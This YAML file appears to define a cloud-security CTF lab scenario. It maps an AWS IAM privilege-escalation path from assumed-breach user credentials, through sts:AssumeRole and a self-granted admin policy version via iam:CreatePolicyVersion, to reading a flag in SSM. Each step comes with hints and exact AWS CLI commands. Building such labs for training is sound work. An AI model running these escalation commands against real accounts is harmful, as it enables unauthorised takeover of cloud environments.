attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-iam-001-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has permission to assume the starting role, which itself holds
        iam:CreatePolicyVersion on its own attached policy.

    - id: starting-role
      label: "Starting Role"
      type: principal
      subType: iam-role
      arn: "arn:aws:iam::{account_id}:role/pl-prod-iam-001-to-admin-starting-role"
      description: >
        This IAM role holds iam:CreatePolicyVersion permission scoped to its own
        attached policy. By creating a new policy version that grants AdministratorAccess,
        the role can escalate its own privileges to full administrative control. After
        self-escalation, this role has full administrative permissions in the AWS account
        and can read the scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/iam-001-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (the new policy version
        granting Action:* on Resource:* provides ssm:GetParameter implicitly). Your goal
        is to read this parameter using the admin access gained in the previous step.

  edges:
    - from: starting-user
      to: starting-role
      label: "sts:AssumeRole"
      description: >
        The starting user assumes the starting role to gain the iam:CreatePolicyVersion
        capability needed for self-escalation.
      hints:
        - "Use sts:AssumeRole to obtain credentials for the starting role before attempting any policy operations."
        - "Browse to https://pathfinding.cloud/paths/iam-001 for full technique details."
      commands:
        - description: "Assume the starting role"
          command: "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-001-to-admin-starting-role --role-session-name escalation-session"

    - from: starting-role
      to: starting-role
      label: "iam:CreatePolicyVersion"
      grantsAdmin: true
      description: >
        Create a new version of the policy attached to this role that grants
        AdministratorAccess and set it as the default, achieving full privilege escalation.
      hints:
        - "Create a new version of the policy attached to this role using iam:CreatePolicyVersion with --set-as-default, setting Action '*' and Resource '*' to grant full admin access. Your existing session already has the new permissions -- no re-assume needed."
        - "Wait 15 seconds after creating the new version before verifying -- IAM changes need time to propagate."
        - "Browse to https://pathfinding.cloud/paths/iam-001 for full technique details."
      commands:
        - description: "List policies attached to the starting role"
          command: "aws iam list-attached-role-policies --role-name pl-prod-iam-001-to-admin-starting-role"
        - description: "List existing policy versions"
          command: "aws iam list-policy-versions --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-001-to-admin-policy"
        - description: "Create a new policy version with AdministratorAccess"
          command: "aws iam create-policy-version --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-001-to-admin-policy --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}' --set-as-default"
        - description: "Verify administrator access"
          command: "aws iam list-users"

    - from: starting-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With the new policy version now active, the starting role session has full
        administrator access. Use those credentials to read the scenario flag from
        SSM Parameter Store. The Action:* policy version grants ssm:GetParameter
        implicitly, so no additional permissions are needed.
      hints:
        - "Use the elevated credentials to read the flag from SSM Parameter Store at the path shown in the target node ARN."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/iam-001-to-admin --query 'Parameter.Value' --output text"
